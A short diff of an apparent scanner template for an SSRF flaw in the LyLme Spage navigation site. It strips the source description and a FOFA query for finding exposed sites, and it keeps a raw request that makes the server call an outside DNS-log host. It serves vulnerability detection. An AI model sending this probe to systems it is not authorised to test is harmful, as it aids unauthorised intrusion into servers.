@@ -3,12 +3,8 @@ info:
   name: 六零导航页存在SSRF漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xazulmy9eno93rou'
+  description: ''
   tags: ssrf,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xazulmy9eno93rou
-    fofa: title=="上网导航 - LyLme Spage" || body="https://blog.lylme.com/"
 http:
 - raw:
   - 'GET /apply/index.php?url=http://www.dnslog.cn HTTP/1.1
